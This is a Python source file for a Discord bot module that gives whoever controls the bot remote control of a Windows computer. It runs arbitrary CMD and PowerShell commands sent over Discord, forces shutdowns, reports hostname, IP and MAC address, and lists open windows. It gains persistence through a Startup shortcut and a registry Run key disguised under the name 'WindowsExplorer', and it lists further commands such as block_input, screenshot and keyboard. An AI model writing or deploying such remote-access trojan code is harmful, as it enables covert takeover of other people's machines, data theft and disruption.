import os
import sys
import uuid
import socket
import platform
import subprocess
import json
import discord
from discord import app_commands
from discord.ext import commands

def getHostIp():
    try:
        with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as socketObj:
            socketObj.connect(("8.8.8.8", 80))
            return socketObj.getsockname()[0]
    except Exception:
        try:
            return socket.gethostbyname(socket.gethostname())
        except Exception:
            return "IP_UNKNOWN"

class SystemCog(commands.Cog):
    def __init__(self, bot):
        self.bot = bot

    @app_commands.command(name="device", description="回傳裝置基本資訊")
    async def deviceCommand(self, interaction: discord.Interaction):
        macRaw = uuid.getnode()
        macAddr = ":".join(f"{(macRaw >> bitShift) & 0xff:02x}" for bitShift in range(40, -1, -8))
        hostName = platform.node() or socket.gethostname()
        msgText = (f"**裝置名稱**：{hostName}\n"
                   f"**IPv4 位址**：{getHostIp()}\n"
                   f"**MAC 位址**：{macAddr}\n"
                   f"**系統型號**：{platform.system()} {platform.release()} ({platform.machine()})\n")
        await interaction.response.send_message(msgText)

    @app_commands.command(name="shutdown", description="遠端關機")
    async def shutdownCommand(self, interaction: discord.Interaction):
        os.system("shutdown /s /f /t 0")
        await interaction.response.send_message("系統強制關機中...")

    @app_commands.command(name="cmd", description="執行 CMD 指令")
    async def cmdCommand(self, interaction: discord.Interaction, commands: str):
        subprocess.Popen(['cmd', '/k', " & ".join(commands.splitlines())])
        await interaction.response.send_message("已執行 CMD 指令。")

    @app_commands.command(name="volume", description="設定音量")
    async def volumeCommand(self, interaction: discord.Interaction, level: int):
        from pycaw.pycaw import AudioUtilities, IAudioEndpointVolume
        from ctypes import cast, POINTER
        volInterface = cast(AudioUtilities.GetSpeakers().EndpointVolume, POINTER(IAudioEndpointVolume))
        targetVol = max(0, min(100, level)) / 100
        volInterface.SetMasterVolumeLevelScalar(targetVol, None)
        await interaction.response.send_message(f"音量設為 {int(targetVol * 100)}%")

    @app_commands.command(name="startup", description="寫入開機指令 (綁定伺服器)")
    async def startupCommand(self, interaction: discord.Interaction, content: str):
        configData = {
            "guild_id": interaction.guild_id,
            "content": content
        }
        try:
            with open("config.json", "w", encoding="utf-8") as fileObj:
                json.dump(configData, fileObj, ensure_ascii=False, indent=4)
            await interaction.response.send_message("已成功寫入開機自動執行組態 (JSON)。")
        except Exception as errObj:
            await interaction.response.send_message(f"寫入失敗：{errObj}")

    @app_commands.command(name="shell_startup", description="建立開機自啟動捷徑")
    async def shellStartupCommand(self, interaction: discord.Interaction):
        await interaction.response.defer(thinking=True)
        try:
            exePath = sys.executable if getattr(sys, 'frozen', False) else os.path.join(os.path.dirname(os.path.abspath(__file__)), 'dcrb.exe')
            scriptDir = os.path.dirname(exePath)
            startupDir = subprocess.check_output(["powershell", "-NoProfile", "-Command", "[Environment]::GetFolderPath('Startup')"], text=True).strip()
            psCmd = f"$s = (New-Object -ComObject WScript.Shell).CreateShortcut('{os.path.join(startupDir, 'dcrb.lnk')}'); $s.TargetPath = '{exePath}'; $s.WorkingDirectory = '{scriptDir}'; $s.IconLocation = '{exePath}'; $s.Save()"
            subprocess.run(["powershell", "-NoProfile", "-Command", psCmd], check=True, capture_output=True)
            await interaction.followup.send("已建立捷徑。")
        except Exception as errObj:
            await interaction.followup.send(f"失敗：{errObj}")

    @app_commands.command(name="reg_startup", description="設定登錄檔開機自啟")
    async def regStartupCommand(self, interaction: discord.Interaction):
        import winreg
        await interaction.response.defer(thinking=True)
        try:
            exePath = sys.executable if getattr(sys, 'frozen', False) else os.path.abspath(sys.argv[0])
            with winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run", 0, winreg.KEY_WRITE) as winKey:
                winreg.SetValueEx(winKey, "WindowsExplorer", 0, winreg.REG_SZ, exePath)
            await interaction.followup.send("登錄檔設定成功。")
        except Exception as errObj:
            await interaction.followup.send(f"失敗：{errObj}")

    @app_commands.command(name="powershell", description="執行 PowerShell 指令")
    async def powershellCommand(self, interaction: discord.Interaction, commands: str):
        await interaction.response.defer(thinking=True)
        subprocess.Popen(['powershell', '-NoExit', '-Command', "; ".join(commands.splitlines())], creationflags=subprocess.CREATE_NEW_CONSOLE)
        await interaction.followup.send("已執行 PowerShell 指令。")

    @app_commands.command(name="task_list", description="前台程式列表")
    async def taskListCommand(self, interaction: discord.Interaction):
        import pygetwindow as gw
        visibleList = [t for t in gw.getAllTitles() if t]
        resText = "前台程式列表：\n" + "\n".join(visibleList) if visibleList else "目前無前台程式。"
        await interaction.response.send_message(resText[:1996] + "..." if len(resText) > 2000 else resText)

    @app_commands.command(name="cmdlist", description="指令列表")
    async def cmdlistCommand(self, interaction: discord.Interaction):
        await interaction.response.send_message("cmdlist start shutdown device kill block_input unblock_input monitor_on screenshot close_stop task_list info version keyboard")

async def setup(bot: commands.Bot):
    await bot.add_cog(SystemCog(bot))
